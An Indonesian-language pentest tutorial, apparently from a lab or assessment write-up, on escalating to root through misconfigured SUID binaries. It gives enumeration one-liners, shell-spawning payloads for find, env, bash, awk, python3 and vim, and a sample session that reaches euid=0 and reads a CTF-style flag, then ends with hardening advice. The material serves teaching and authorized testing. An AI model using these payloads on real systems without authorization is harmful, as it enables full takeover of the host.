# Exploiting SUID (Set User ID Privilege Escalation)

> **Tujuan:** Memanfaatkan binary ber‑SUID milik **root** untuk mempertahankan **effective UID (euid=0)** dan mendapatkan shell sebagai **root**.

---

## Penjelasan Singkat

**SUID (Set User ID)** adalah bit permission pada file Unix/Linux yang menyebabkan file dieksekusi dengan **effective UID** pemilik file. Jika binary SUID dimiliki **root** dan dapat disalahgunakan, attacker dapat memperoleh **root shell**.

---

## Cari Binary SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# Mencari semua file yang memiliki SUID bit
```

Verifikasi bit SUID (huruf `s` pada permission):

```bash
ls -la /usr/bin/find
# Output: -rwsr-xr-x 1 root root ... /usr/bin/find
#         ^ bit "s" menandakan SUID (berjalan sebagai root)
```

Tampilan **aman** (binary SUID wajar, tidak bisa diabuse):

```text
/usr/bin/passwd          ← wajar, passwd memang butuh SUID
/usr/bin/sudo            ← wajar, sudo memang butuh SUID
/usr/bin/mount           ← wajar, mount butuh privilege
/usr/bin/su              ← wajar, su memang butuh SUID
```

Tampilan **rentan** (ada binary SUID yang bisa spawn shell):

```text
www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd          ← wajar, passwd memang butuh SUID
/usr/bin/sudo            ← wajar, sudo memang butuh SUID
/usr/bin/mount           ← wajar, mount butuh privilege
/usr/bin/find            ← RENTAN! find bisa -exec shell
/usr/bin/vim             ← RENTAN! vim bisa shell escape
/usr/bin/python3.11      ← RENTAN! interpreter bisa setuid(0)
```

Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:

```bash
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
```

- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID (vektor file ini)
- `sudo -l` → enumerasi permission sudoers → [Sudo.md](Sudo.md)
- `getcap -r / 2>/dev/null` → enumerasi capabilities → [Capabilities.md](Capabilities.md)

> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Oneliner inilah yang dipakai pada PoC laporan (langkah eskalasi root) karena satu command langsung menyingkap ketiga vektor LPE sekaligus.

---

## Cek GTFOBins

Untuk tiap binary → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **SUID** untuk melihat apakah binary tersebut dapat disalahgunakan.

---

## Pola Umum Eksploitasi

```bash
./binary -p ...                       # -p mempertahankan euid
env /bin/sh -p                        # SUID env /usr/bin/env
bash -p                               # SUID bash /usr/bin/bash
find . -exec /bin/sh -p \; -quit      # SUID find /usr/bin/find
awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk) /usr/bin/awk
```

| Binary | Teknik | Catatan |
|--------|--------|---------|
| `find` | `-exec /bin/sh` | Shell dijalankan dengan euid |
| `env` | `/bin/sh -p` | Preserve euid via env |
| `bash` | `-p` | Mempertahankan euid |
| `awk`/`mawk` | `system("/bin/sh")` | Menjalankan command |
| `python3` | `os.setuid(0)` + `execl` | Spawn shell via Python |
| `vim` | `:!/bin/sh -p` | Shell escape command-mode |

Payload tambahan:

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'   # SUID python3
vim -c ':!/bin/sh -p'                                                 # SUID vim
```

---

## Contoh Tampilan Eksploitasi (Root Shell)

```text
www-data@jobportal:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 32016 Feb  8  2024 /usr/bin/find
   ^ bit "s" = SUID, dimiliki root → binary ini berjalan sebagai root

www-data@jobportal:~$ find . -name "x" -exec /bin/sh -p \;
$ id
uid=33(www-data) euid=0(root) gid=33(www-data) groups=33(www-data)
$ whoami
root
$ cat /root/flag.txt
FLAG{suid_binary_leads_to_root}
```

> **Capture:** Eksploitasi berhasil — `euid=0(root)` muncul karena flag `-p` mempertahankan effective UID dari SUID. Shell aktif sebagai root dan flag di `/root/flag.txt` berhasil dibaca.

---

## Catatan Penting — Privilege Drop

Payload yang menggunakan `system()` → `/bin/sh` (dash) dapat **menurunkan privilege**.

### Solusi

- Gunakan binary yang melakukan `execve` langsung (`env`, `find`).
- Atau gunakan **`/bin/bash -p`** untuk mempertahankan euid.

> Beberapa shell seperti `dash` otomatis menurunkan privilege. Karena itu, shell yang digunakan harus mempertahankan **effective UID** agar privilege SUID tidak hilang.

---

## Alur Eksploitasi

```text
Cari SUID
    ↓
Identifikasi binary
    ↓
Cek GTFOBins → SUID
    ↓
Validasi permission & konfigurasi
    ↓
Uji teknik yang sesuai
    ↓
Verifikasi privilege dengan id
```

---

## Pengerasan Keamanan (Hardening)

- **Audit Rutin SUID** Lakukan audit berkala pada seluruh binary ber-SUID (`find / -perm -4000`) dan hapus bit SUID yang tidak diperlukan (`chmod u-s <binary>`).
- **Gunakan Allowlist** Batasi SUID hanya pada binary minimal esensial (`passwd`, `sudo`, `su`, `mount`).
- **Hindari Binary Interpreting** Jangan berikan bit SUID pada interpreter (python, perl, ruby, node) maupun editor (vim, awk) karena semuanya bisa spawn shell.

---

## Checklist SUID LPE

- [ ] Jalankan `find / -perm -4000 -type f 2>/dev/null`.
- [ ] Identifikasi binary SUID milik root.
- [ ] Cek di [GTFOBins](https://gtfobins.github.io) → bagian **SUID**.
- [ ] Pilih teknik yang tepat (`-p`, `exec`, `system`, dll.).
- [ ] Uji payload dan pastikan euid tetap 0.
- [ ] Verifikasi dengan `id` → `uid=0(root) euid=0(root)`.

---

## Referensi

- [GTFOBins – SUID](https://gtfobins.github.io/)
- [Linux Man Page – SUID](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
